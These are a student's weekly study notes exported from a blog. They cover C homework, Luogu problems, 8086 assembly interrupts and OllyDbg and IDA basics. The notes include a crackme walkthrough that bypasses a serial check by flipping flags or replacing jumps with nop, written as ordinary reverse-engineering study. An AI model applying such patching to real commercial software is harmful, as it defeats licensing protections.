class="keyword">if</span>(head-&gt;elecode!=n) &#123;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">				nextp=nextp-&gt;next;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;错误编码&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			</span><br><span class="line">			nextp-&gt;next=head-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(head);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;成功删除&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	FILE* fp;</span><br><span class="line">	fp = fopen(<span class="string">&quot;.\\medinfo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (p) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d %s %.2lf %s %d %d %d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line"></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;保存成功\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">nextp</span>=</span>p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">while</span>(nextp) &#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			nextp=nextp-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;.\\medinfo.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件无法打开&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		struct med *nextp,*head;</span><br><span class="line">		head=<span class="literal">NULL</span>;</span><br><span class="line">		nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;elecode)==<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,nextp-&gt;name);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%lf&quot;</span>,&amp;nextp-&gt;price);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,&amp;nextp-&gt;type);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;prod);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;shelf);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;stock);</span><br><span class="line">			<span class="keyword">if</span>(head==<span class="literal">NULL</span>) &#123;</span><br><span class="line">				head=nextp;</span><br><span class="line">				p=head;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				head-&gt;next=nextp;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">			nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.17-2020.02.23</title>
    <url>/12995.html</url>
    <content><![CDATA[<h1>洛谷</h1>
<h2 id="函数整理">函数整理</h2>
<h3 id="memset">memset</h3>
<p>memset(数组名或指针，值，大小)<br>
可用于数组初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="sprintf">sprintf</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(<span class="keyword">char</span> *str, <span class="keyword">char</span> * format [, argument, ...]);  </span><br></pre></td></tr></table></figure>
<p>str为要写入的字符串；format为格式化字符串，与printf()函数相同；argument为变量。<br>
可用于把整数搞进字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%8x&quot;</span>, <span class="number">4567</span>);  <span class="comment">//小写16进制，宽度占8个位置，右对齐，保存在s中</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;The ASCII code of a is %d.&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>sprintf不检测数组长度，容易造成缓冲区溢出，可用snprintf()代替</p>
<h2 id="题">题</h2>
<h3 id="P1031-均分纸牌">P1031 均分纸牌</h3>
<p><img src="https://s2.ax1x.com/2020/02/23/3llMYn.md.png" alt=" "></p>
<p> <br>
没啥思路就看了题解:<br>
<img src="https://s2.ax1x.com/2020/02/23/3llnoj.png" alt=""><br>
得到代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">		sum+=a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sum=sum/n;</span><br><span class="line">    <span class="comment">//均分过程：</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]-sum!=<span class="number">0</span>)&#123;</span><br><span class="line">			a[i+<span class="number">1</span>]+=a[i]-sum,</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,cnt);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="P1548-棋盘问题">P1548 棋盘问题</h3>
<p><img src="https://s2.ax1x.com/2020/02/23/3llKFs.png" alt=" "></p>
<p> <br>
思路：只会枚举<br>
<img src="https://s2.ax1x.com/2020/02/23/3lleeg.md.png" alt=""><br>
(突然发现多弄了一个点上去…)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="keyword">int</span> rectangle=<span class="number">0</span>,square=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">0</span>;a&lt;m+<span class="number">1</span>;a++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>;b&lt;n+<span class="number">1</span>;b++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> x=a+<span class="number">1</span>;x&lt;m+<span class="number">1</span>;x++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> y=b+<span class="number">1</span>;y&lt;n+<span class="number">1</span>;y++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(a-x==b-y)</span><br><span class="line">						square++;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						rectangle++;</span><br><span class="line">						</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,square,rectangle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>汇编学习</h1>
<h3 id="中断过程">中断过程</h3>
<p>cpu的硬件自动完成：用中断类型码找到中断向量，并用它设置cs和ip 这个工作的过程<br>
cpu在完成中断处理程序后，返回原来的执行点继续执行下面的指令。所以在设置cs:ip之前，还要将原来的cs和ip的值保存起来（同样，在使用call指令时也先保存当前cs和ip的值，再设置cs和ip）<br>
8086cpu收到中断信息后引发的中断过程：</p>
<ol>
<li>取得中断类型码</li>
<li>标志寄存器入栈</li>
<li>设置标志寄存器TF和IF值位0</li>
<li>cs内容入栈</li>
<li>ip内容入栈</li>
<li>从内存地址为中断类型码 *4和中断类型码 *4+2的两个字单元中读取中断处理程序的入口设置为cs和ip</li>
</ol>
<p>即：</p>
<ol>
<li>取得中断类型码N</li>
<li>pushf</li>
<li>TF=0,IF=0</li>
<li>push cs</li>
<li>push ip</li>
<li>(ip)=(N* 4),(cs)=(N* 4+2)</li>
</ol>
<h3 id="中断处理程序和iret指令">中断处理程序和iret指令</h3>
<p>由于cpu随时都可能检测到中断信息，随时都可能执行中断处理程序，所以中断处理程序必须一直储存在内存某段空间之中。<br>
中断处理程序的编写步骤：</p>
<ol>
<li>保存用到的寄存器</li>
<li>处理中断</li>
<li>恢复用到的寄存器</li>
<li>用iret指令返回</li>
</ol>
<p>iret指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">popf</span><br></pre></td></tr></table></figure>
<p> </p>
<p>8086支持256个中断，但系统中要处理的中断事件没有达到256个，所以在中断向量表中，许多单元都是空的</p>
<h3 id="单步中断">单步中断</h3>
<p>cpu在执行完一条指令后，如果检测到标志寄存器的TF位为1，则产生单步中断<br>
引发中断过程：</p>
<ol>
<li>取得中断类型码1</li>
<li>标志寄存器入栈，TF、IF设置为0<br>
#否则cpu永远只能执行单步中断处理程序的第一条指令</li>
<li>cs、ip 入栈</li>
<li>(ip)=(1* 4),(cs)=(1* 4+2)</li>
</ol>
<p>如果cpu不提供其他功能，只要cpu一加电，它就从预设的地方自动向下一直读取指令执行<br>
debug利用了cpu提供的功能，在使用T命令时，debug将TF设置为1<br>
cpu提供单步中断功能的原因：单步跟踪程序的执行过程</p>
<p>IF：中断允许标志位。控制cpu是否允许接收外部中断请求。若IF=1，8086能响应外部中断</p>
<h3 id="响应中断的特殊情况">响应中断的特殊情况</h3>
<p>如：</p>
<blockquote>
<p>在执行完向ss寄存器传送数据的指令后，即使发生中断，cpu也不会响应<br>
（<a href="https://brubbish.github.io/19661.html%EF%BC%89">https://brubbish.github.io/19661.html）</a></p>
</blockquote>
<p>如果在执行完设置ss的指令后 cpu响应中断，需要在栈中压入标志寄存器、cs和ip的值。而ss改变，sp未改变，ss：sp指向错误的栈顶，将引起错误。</p>
<p>应该利用这个特性，将设置ss和sp的指令连续存放</p>
<h3 id="int指令">int指令</h3>
<p>cpu执行int n 指令，相当于引发一个n号中断的过程：</p>
<ol>
<li>取中断类型码n</li>
<li>标志寄存器入栈，IF=0,TF=0</li>
<li>cs、ip 入栈</li>
<li>(ip)=(n *4), (cs)=(n *4+4)</li>
</ol>
<p>int 指令的最终功能与call指令相似，都是调用一段程序</p>
<h3 id="DOS中-断例程应用-中断例程">DOS中 断例程应用(中断例程)</h3>
<p>int 21h 中断例程是dos提供的中断例程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>是int 21h中断例程的4ch号功能等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah,4h       ;程序返回</span><br><span class="line">mov al,0        ;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>(ah)=4ch代表调用第21h号中断例程的4ch号子程序</p>
<h2 id="端口">端口</h2>
<p>各种存储器都和cpu的地址线、数据线、控制线相连。cpu在操作它们的时候，把他们都当作内存对待，把它们总的看做一个由若干存储单元组成的逻辑存储器（内存地址空间）<br>
和cpu通过总线相连的芯片除了存储器外，还有：</p>
<ol>
<li>接口卡上的接口芯片</li>
<li>主板上的接口芯片，cpu通过它们对部分外部设备进行访问</li>
<li>其他芯片</li>
</ol>
<p>在这些芯片中，都有一组可由cpu读写的寄存器，这些寄存器通过芯片和cpu的总线相连。cpu将这些寄存器当作端口，对它们进行统一编址，从而建立了统一的端口地址空间。</p>
<p>cpu可以直接读写：cpu内部寄存器、内存单元、端口 的数据</p>
<h3 id="端口的读写">端口的读写</h3>
<p>cpu最多可以定位64kb个不同的端口，端口地址范围为：0~65535<br>
端口的读写指令只有  in（从端口读取）和out（往端口写入)<br>
在in和out指令中，只能使用ax或al来存放读入或发送的数据。8位端口用al，16位端口用ax<br>
对0~255的端口进行读写时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in al,20h</span><br><span class="line">out 20h,al</span><br></pre></td></tr></table></figure>
<p>对255~65535的端口进行读写时端口号放在dx中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dx,3f8h</span><br><span class="line">in al,dx</span><br><span class="line">out dx,al</span><br></pre></td></tr></table></figure>
<h3 id="CMOS-RAM芯片">CMOS RAM芯片</h3>
<p>包含一个实时钟和128个字节的ram存储器<br>
由电池供电，关机后仍然工作，ram中信息不丢失<br>
一部分单元保存时间信息，其余大部分单元保存系统配置信息<br>
有两个端口，70h为地址端口，71h为数据端口</p>
<h2 id="shl和shr指令">shl和shr指令</h2>
<p>shl是逻辑左移指令，移出的最后一位写入cf中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">shl al,1          ;将al中的数据左移一位</span><br></pre></td></tr></table></figure>
<p>执行后(al)=10010000, cf=0</p>
<p>移动位数大于1时，将移动位数放在cl中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">mov cl,3</span><br><span class="line">shl al,cl</span><br></pre></td></tr></table></figure>
<p> <br>
shr是逻辑右移指令，移出的最后一位写入cf中</p>
<p>左移一位相当于X=X*2,右移一位相当于X=X/2</p>
<h3 id="CMOS-RAM中储存的时间信息">CMOS RAM中储存的时间信息</h3>
<p>CMOS RAM中存放着年月日时分秒，这六个信息长度都为一个字节，以BCD码的方式存放。</p>
<h4 id="BCD码">BCD码</h4>
<p>以四位二进制数表示十进制数的编码方式<br>
一个字节可以表示两个BCD码，高4位表示十位，低4位表示个位</p>
<h2 id="外中断">外中断</h2>
<p>及时处理外设的输入需要解决：1.cpu如何得知外设输入的时间 2.cpu从何处得到外设的输入</p>
<h3 id="外中断信息">外中断信息</h3>
<p>当cpu外部有需要处理的事情发生的时候，相关芯片将向cpu发出相应的中断信息。cpu在执行完当前指令后，可以检测到发送过来的中断信息，引发中断过程，处理外设的输入</p>
<h4 id="外中断源：">外中断源：</h4>
<ul>
<li>可屏蔽中断</li>
</ul>
<p>是cpu可以不响应的外中断。如果IF=1，则cpu在执行完当前指令后响应中断；如果IF=0，则不响应可屏蔽中断<br>
中断类型码由数据总线送入cpu，不由cpu产生</p>
<p>8086提供的设置IF指令：<br>
1.sti—设置IF=1<br>
2.cli—设置IF=0</p>
<ul>
<li>不可屏蔽中断</li>
</ul>
<p>是cou必须响应的外中断。<br>
对于8086cpu，不可屏蔽中断的中断类型码固定为2</p>
<p>几乎所有由外设引发的外中断都是可屏蔽中断<br>
不可屏蔽中断是在系统中有必须处理的紧急情况发生时用来通知cpu的中断信息</p>
<h3 id="pc机键盘的处理过程">pc机键盘的处理过程</h3>
<ol>
<li>键盘输入<br>
按下一个键时，键盘中的芯片产生一个扫描码（通码），说明了按下的建在键盘上的位置；松开按下的键时，也产生一个扫描码（断码），送入60h端口<br>
扫描码的长度为一个字节，通码第七位为0，断码第七位为1：通码+80h=通码</li>
<li>引发9号中断<br>
相关芯片向cpu发出中断类型码为9的可屏蔽中断信息</li>
<li>执行int 9 中断例程<br>
BIOS提供了int 9中断例程，用来进行基本的键盘输入处理：<br>
1.读出扫描码<br>
2.如果是字符键的扫描码，将该扫描码和对应的ASCII码送入内存中的BIOS键盘缓冲区；如果是控制键，则将其转变为状态字节（二进制位控制状态的字节）写入内存中储存状态字节的单元<br>
3.对键盘系统进行相关控制</li>
</ol>
<p>BIOS键盘缓冲区是系统启动后，BIOS用于存放INT 9中断例程所接收的键盘输入的内存区。可以储存15个键盘输入，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码</p>
<h2 id="直接定址表">直接定址表</h2>
<h3 id="描述了单元长度的标号">描述了单元长度的标号</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br></pre></td></tr></table></figure>
<p>a,b 后面没有’:’ ，这种标号不但表示了内存单元的地址，还表示了内存单元的长度，即字节单元(db)或字单元(dw)或双子单元(dd)</p>
<p>offset操作符：取得标号的段地址（<a href="https://brubbish.github.io/34199.html#offset">https://brubbish.github.io/34199.html#offset</a> ）<br>
seg操作符：取得标号的段地址</p>
<h1>OllyDbg 学习</h1>
<h2 id="32位寄存器">32位寄存器</h2>
<p>有EAX、ECX、EDX、EBX、ESP、EBP、ESI等。<br>
调试时可以双击寄存器，修改寄存器的值。对EIP寄存器需要在反汇编窗口选择新的指令起始地址（‘New origin here’）<br>
标志寄存器：C、P、A、Z、S、T、D、O,双击值可以在0和1值切换</p>
<h2 id="单步跟踪快捷键">单步跟踪快捷键</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F7    单步步进，遇到call指令跟进</span><br><span class="line">F8    单步步过，遇到call指令不跟进</span><br><span class="line">F9+CTRL   直到出现ret/retf/iret指令中断</span><br><span class="line">F9+Alt    回到应用程序领空</span><br><span class="line">F9    运行程序</span><br><span class="line">F2    设置断点</span><br><span class="line">F2+CTRL   重新调试</span><br><span class="line">F12   暂停程序</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="一个TraceMe">一个TraceMe</h2>
<p>win32位获取文本框中内容的函数：<br>
GetDlgItemTextA<br>
GetDlgItemTextW<br>
GetWindowTextA<br>
GetWindowTextW<br>
用’CTRL+G’打开跟随表达式窗口进行搜索</p>
<p>在函数入口处设一个断点，程序执行到此处暂停<br>
<img src="https://s2.ax1x.com/2020/02/21/3KiIIJ.png" alt=""><br>
然后按’F9+Alt’跳到调用函数的位置<br>
 </p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KEqte.png" alt=""><br>
004011E5-004011F5是用来判断用户名和序列号的<br>
顺便：因为真没见过test指令所以搜了一下：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kOTg5NDAzNzI5YWI=">汇编语言–test和cmp区别<i class="fa fa-external-link-alt"></i></span><br>
 </p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KiTi9.png" alt=""><br>
执行到004011F5处，为了不跳转，把ZF寄存器取反或把此处指令改为nop<br>
另外，程序限制字符要大于4个，在004011D5的位置。可以把此处跳转的指令（jl）改为nop，或把SF值和OF值改为相同。<br>
<img src="https://s2.ax1x.com/2020/02/21/3Ki5a4.png" alt="..."></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.24-2020.03.01</title>
    <url>/9fec375a.html</url>
    <content><![CDATA[<h1>OllyDbg 学习</h1>
<h2 id="常用断点">常用断点</h2>
<h3 id="int-interrupt-3断点">int(interrupt) 3断点</h3>
<p>在OD中用’F2’来设置，机器码是0xCC<br>
执行一个int 3断点时，该地址处的指令首字节修改位CC（OD显示的还是原来的指令）</p>
<p>优点是可以设置无数个指令，缺点是<strong>改变了原程序机器码，容易被软件检测到</strong>，例如有些软件会检测api的首地址是否为0xCC</p>
<h3 id="硬件断点">硬件断点</h3>
<p>和DRx调试寄存器有关<br>
DRx调试器共有8个（x从0 ~ 7）</p>
<p><img src="https://s2.ax1x.com/2020/02/24/3G1qVf.png" alt=" "></p>
<span id="more"></span>
<p>0 ~ 3：调试地址寄存器，用于保存需要监视的地址，例如设置硬件断点<br>
4、5：（先不做了解）<br>
6：调试寄存器组状态寄存器（‘这个寄存器主要是在调试异常产生后，报告产生调试异常的相关信息’)<br>
7：调试寄存器组控制寄存器，控制调试<br>
硬件断点的原理是使用DR0、DR1、DR2、DR3设定地址，并用DR7设定状态，因此最多设置4个断点<br>
设置方法为：1.在代码行单击右键，执行’断点’-&gt;‘硬件执行 2.在数据窗口’右键’-&gt;‘硬件访问断点’-&gt;（选择数据长度1/2/4字节），如4字节（Dword)当访问xxxxx0~xxxxx3的内存时会被断下</p>
<p>快捷键’F4’执行到光标所在的行</p>
<h3 id="内存断点">内存断点</h3>
<p>原理是对所设的地址赋予不可访问/不可写属性，当访问/写入的时候就会产生异常，OD比较异常地址是不是断点地址，如果是就中断<br>
设置内存断点在每次出现异常时都需要比较来判断是否应该中断，所以会降低OD的执行速度<br>
OD只能下一个内存断点，设置方法为：在数据/代码窗口选中要下断点的地址区域，右键执行’断点’-&gt;‘内存写入’<br>
硬件访问/写入断点实在触发硬件断点的下一条指令处下断；内存断点是在触发断点的指令处下断。<br>
内存断点不修改原始代码，不会因为被程序校验而失败</p>
<h3 id="内存访问一次性断点">内存访问一次性断点</h3>
<p>windows 对内存使用段页式的管理方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(quote):</span><br><span class="line">段页式存储管理方式即先将用户程序分成若干个段，再把每个段分成若干个页，并为每一个段赋予一个段名。</span><br><span class="line">（基本分段存储管理方式和基本分页存储管理方式原理的结合）</span><br></pre></td></tr></table></figure>
<p>快捷键’Alt+M’显示内存，可以看到许多段，每个段都有不可访问、读、写、执行属性<br>
可用’F2’对整个段设置断点。当所在段被读取或执行时，中断发生，断点删除。</p>
<h3 id="消息断点">消息断点</h3>
<p>当某个特定窗口函数接收到某个特定消息时，消息断点将使程序中断<br>
消息断点与INT 3断点的区别在于：INT 3 断点可以在程序启动之前设置，消息断点<strong>只有在窗口被创建后才能设置</strong></p>
<p>当用户点击按钮、移动光标、输入文字时，一条消息就会发送给当前窗体。发送的信息有4个参数：1个窗口句柄，1个消息编号，2个32位长的参数。<br>
设置方法：工具栏中的’w’按钮，在条目上单击右键…。</p>
<p>ps：<em>当单击按钮并松开时会发送’WM_LBUTTONUP’这个消息。</em></p>
<h3 id="条件断点">条件断点</h3>
<p>在满足一定条件时才会中断。OD中可以按寄存器、储存器、消息等设断点。<br>
用带有条件表达式的INT 3 断点，当调试器遇到断点时，计算表达式的值，如果表达式有效则断点生效。</p>
<ol>
<li>按寄存器条件中断<br>
快捷键’Shift+F2’ 条件表达式例如：  eax==0400000</li>
<li>按存储器条件中断<br>
<em>（CreateFileA函数用于打开文件，可对其设断）</em><br>
在栈窗口右键，执行’Address’-&gt;'Relative to ESP’可看到各个参数相对于当前ESP的地址，如果要得到第一个参数的地址，可以用[ESP+4],如果要得到指向的字符串，使用[[ESP+4]],表达式可用：[STRING [ESP+4]]==“…”(STRING前缀是“以0结尾的ASCII字符串”,还有UNICODE前缀等)</li>
</ol>
<h3 id="条件记录断点">条件记录断点</h3>
<p>可以记录断点处函数表达式或参数的值，也可以设置断点次数，每次符合条件暂停后计数值-1<br>
快捷键’Shift+F4’打开条件记录窗口<br>
条件记录断点可以向插件传递多个命令</p>
<h2 id="插件">插件</h2>
<p>OD只能加载32个插件<br>
添加插件可通过将插件复制到’plugin’文件夹中</p>
<h2 id="Run-trace">Run trace</h2>
<p>把程序执行过的指令保存下来。<br>
将地址、寄存器等记录到Run tarce 缓冲区中。如果缓冲区太小可能造成缓冲区溢出，OD会自动丢弃旧记录。<br>
数据可以在’查看’-&gt;‘RUN跟踪’里（或按’…‘）查看。使用’+‘和’-'浏览程序执行路线</p>
<h2 id="Hit-trace">Hit trace</h2>
<p>分辨哪一部分代码被执行了，哪一部分没有执行。在遇到一段跳转分支比较多的代码，需要了解程序执行路线时，可以用Hit trace。<br>
选中代码-&gt;右键-&gt;‘Hit trace’-&gt;‘Add selection’<br>
效果是执行过的指令前为红色，未执行的为蓝色：<br>
<img src="https://s2.ax1x.com/2020/02/28/3D6OqU.png" alt=""></p>
<p>ps：<strong>不要在监视的代码中设置断点</strong></p>
<h2 id="OD常见问题">OD常见问题</h2>
<h3 id="乱码">乱码</h3>
<ol>
<li>右键’分析’-&gt;‘分析代码’或快捷键’Ctrl+A’</li>
<li>右键’分析’-&gt;‘从模块中删除分析’，或在udd文件夹中删除相应文件</li>
</ol>
<h3 id="在反汇编窗口输入’push-E000’不能正确识别">在反汇编窗口输入’push E000’不能正确识别</h3>
<p>改为’push 0E000’</p>
<h3 id="od’假死’">od’假死’</h3>
<p>可能在调试加壳程序时产生<br>
打开’ollydbg.ini’设置’Restore windows 0’</p>
<h1>静态分析技术</h1>
<p>用高级语言写的程序有两种形式。</p>
<ol>
<li>程序被编译成机器语言在cpu上执行<br>
对于这种程序，可以将机器语言转化为汇编语言，这个过程称为<strong>反汇编</strong></li>
<li>边解释边执行（编写这种程序的语言称为解释性语言，如java）<br>
这种语言编译程序后可以被还原成高级语言的原始结构，这个过程被称为<strong>反编译</strong></li>
</ol>
<p>静态分析：通过反编译、反汇编获得程序的汇编代码或源代码，然后分析流程，了解模块的功能</p>
<h2 id="文件类型分析">文件类型分析</h2>
<p>逆向分析程序的第一步<br>
了解编写程序的语言、编译的编译器或是否被加密<br>
各种开发语言都有固定的启动代码，被加密程序处理过的程序中会留下加密软件的相关信息<br>
但有些外壳程序会将一些加壳信息去除，并伪造启动代码，从而欺骗了PEiD等检测分析软件。因此识别工具给出的结果只能作为参考</p>
<h2 id="IDA">IDA</h2>
<p>ida 是按区块装载pe文件的，例如.text代码块、.data数据块、.rsrc资源块、.idata输入表、.edata输出表。<br>
反编译过程分为两个阶段：</p>
<ol>
<li>将代码和数据分开，分析函数的参数调用、跳转等</li>
<li>装载对应的编译器特征文件，给各个函数赋名</li>
</ol>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.02-2020.03.08</title>
    <url>/2f00783a.html</url>
    <content><![CDATA[<h1>IDA</h1>
<h2 id="四个快捷键">四个快捷键</h2>
<p>添加注释：冒号或分号<br>
跳转到某个地址（16进制）：‘G’;返回（后退）：‘Esc’;前进：‘Ctrl+Enter’</p>
<h2 id="交叉参考">交叉参考</h2>
<p>可以知道指令代码相互调用的关系<br>
